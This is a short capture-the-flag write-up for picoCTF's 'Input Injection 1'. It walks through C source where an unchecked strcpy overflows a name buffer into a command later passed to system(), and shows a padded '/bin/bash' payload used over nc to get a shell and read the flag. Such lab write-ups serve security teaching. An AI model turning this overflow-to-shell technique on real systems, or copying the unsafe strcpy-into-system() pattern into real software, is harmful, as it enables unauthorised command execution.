# Input Injection 1
## Pico CTF -- Medium

For this challenge, we are given the [compiled binary](vuln) and the [source code.](vuln.c)

Recall, as variables are declared the stack grows downward, but the contents of those variables grow upwards.

Notice, in main()

    char name[200];
    printf("What is your name?\n");
    fflush(stdout);


    fgets(name, sizeof(name), stdin);
    name[strcspn(name, "\n")] = 0;

    fun(name, "uname");
    return 0;

We read user input into the 200 byte **name** buffer.

fun() takes **name** as a parameter, as well as a system command, and then places both name and the system command into 10 byte buffers.

    void fun(char *name, char *cmd) {
        char c[10];
        char buffer[10];

        strcpy(c, cmd);
        strcpy(buffer, name);

        printf("Goodbye, %s!\n", buffer);
        fflush(stdout);
        system(c);
    }

As a result, any name longer than 10 bytes will overwrite the contents of the command.

    └──╼ $python3
    Python 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> "A" * 10 + "/bin/bash"
    'AAAAAAAAAA/bin/bash'
    >>> 

We can use the above payload to get the flag.


    └──╼ $nc amiable-citadel.picoctf.net 53797
    What is your name?
    AAAAAAAAAA/bin/bash
    Goodbye, AAAAAAAAAA/bin/bash!
    whoami
    ctf-player
    ls
    flag.txt
    cat flag.txt
    picoCTF{XXXXXXXXXXXXXXXXXXXX}